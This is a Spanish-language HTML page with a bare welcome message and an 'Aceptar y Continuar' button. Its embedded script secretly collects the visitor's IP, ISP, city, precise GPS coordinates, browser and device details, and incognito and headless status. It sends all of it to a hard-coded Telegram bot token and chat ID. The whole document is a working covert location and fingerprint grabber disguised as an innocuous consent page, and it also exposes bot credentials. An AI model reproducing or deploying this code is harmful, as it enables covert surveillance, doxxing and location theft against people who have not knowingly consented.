<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Recolección de Información</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
      background-color: #f5f5f5;
    }
    #startBtn {
      padding: 15px 30px;
      font-size: 18px;
      cursor: pointer;
      border: none;
      background-color: #007bff;
      color: white;
      border-radius: 5px;
      transition: background-color 0.3s;
    }
    #startBtn:hover {
      background-color: #0056b3;
    }
    #loading {
      display: none;
      margin-top: 20px;
      font-size: 16px;
      color: #333;
    }
  </style>
</head>
<body>

  <h1>Bienvenido</h1>
  <p>Haz clic en el botón para continuar.</p>
  <button id="startBtn">Aceptar y Continuar</button>
  <div id="loading">Procesando información...</div>

  <script>
    (() => {
      const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
      const CHAT_ID = "6065284869";

      const startBtn = document.getElementById("startBtn");
      const loadingText = document.getElementById("loading");

      let humanInteraction = false;
      ["click", "mousemove", "keydown", "touchstart"].forEach(evt => {
        window.addEventListener(evt, () => { humanInteraction = true; }, { once: true });
      });

      function detectHeadless() {
        return (/HeadlessChrome/.test(navigator.userAgent) || navigator.webdriver) ? "Sí" : "No";
      }

      async function detectIncognito() {
        return new Promise(resolve => {
          const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
          if (!fs) resolve("No detectable");
          else fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Sí"));
        });
      }

      function detectAdblock() {
        return new Promise(resolve => {
          const testAd = document.createElement('div');
          testAd.innerHTML = '&nbsp;';
          testAd.className = 'adsbox';
          testAd.style.position = 'absolute';
          testAd.style.top = '-100px';
          testAd.style.width = '1px';
          testAd.style.height = '1px';
          document.body.appendChild(testAd);
          setTimeout(() => {
            const detected = testAd.offsetHeight === 0;
            document.body.removeChild(testAd);
            resolve(detected ? "Sí" : "No");
          }, 100);
        });
      }

      function checkHardwareAcceleration() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          return gl ? "Sí" : "No";
        } catch (e) {
          return "No";
        }
      }

      function checkTimezoneLocale() {
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const locale = navigator.language;
        return `${timezone} vs ${locale}`;
      }

      async function getIPInfo() {
        try {
          // Usamos ipapi.com como alternativa activa
          const res = await fetch("https://ipapi.com/json/"); 
          if (!res.ok) throw new Error("No response");
          return await res.json();
        } catch {
          return null;
        }
      }

      async function sendToTelegram(message) {
        try {
          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`; 
          const response = await fetch(url, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message,
            }),
          });
          const data = await response.json();
          console.log("Telegram response:", data);
        } catch(e) {
          console.warn("Error sending to Telegram:", e);
        }
      }

      async function collectAndSend() {
        startBtn.style.display = "none";
        loadingText.style.display = "block";

        const [ipRes, geoRes, incognitoStatus, adblockStatus] = await Promise.allSettled([
          getIPInfo(),
          new Promise((res, rej) => {
            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 });
            } else rej();
          }),
          detectIncognito(),
          detectAdblock()
        ]);

        let message = "";

        if (ipRes.status === "fulfilled" && ipRes.value) {
          const ip = ipRes.value;
          message += `IP: ${ip.ip}
ISP: ${ip.org}
ASN: ${ip.asn}
Proxy/VPN/Tor: ${ip.proxy ? "Sí" : "No"}
Ciudad: ${ip.city}
Región: ${ip.region}
País: ${ip.country}
Versión IP: ${ip.type}
\n`;
        } else {
          message += "No se pudo obtener IP\n";
        }

        message += `User-Agent: ${navigator.userAgent}
Navegador Headless: ${detectHeadless()}
Modo Incógnito: ${incognitoStatus.status === "fulfilled" ? incognitoStatus.value : "Desconocido"}
Interacción Humana: ${humanInteraction ? "Sí" : "No"}
Pantalla: ${screen.width}x${screen.height}
Resolución disponible: ${screen.availWidth}x${screen.availHeight}
Touch Support: ${'ontouchstart' in window ? 'Sí' : 'No'}
Plataforma: ${navigator.platform}
Fingerprint: N/A
Aceleración hardware (WebGL renderer): ${checkHardwareAcceleration()}
Timezone vs Locale: ${checkTimezoneLocale()}
AdBlock detectado: ${adblockStatus.status === "fulfilled" ? adblockStatus.value : "No detectable"}
Hora: ${new Date().toLocaleString()}
`;

        await sendToTelegram(message);

        if (geoRes.status === "fulfilled") {
          const {latitude, longitude, accuracy} = geoRes.value.coords;
          const locationInfo = `\nUbicación Precisa:
Latitud: ${latitude}
Longitud: ${longitude}
Precisión: ${accuracy} metros
Hora: ${new Date().toLocaleString()}
`;
          await sendToTelegram(locationInfo);
        }

        // Aquí puedes redirigir o mostrar otro contenido si lo deseas
        loadingText.textContent = "¡Listo! Puedes continuar.";
      }

      startBtn.onclick = collectAndSend;
    })();
  </script>
</body>
</html>
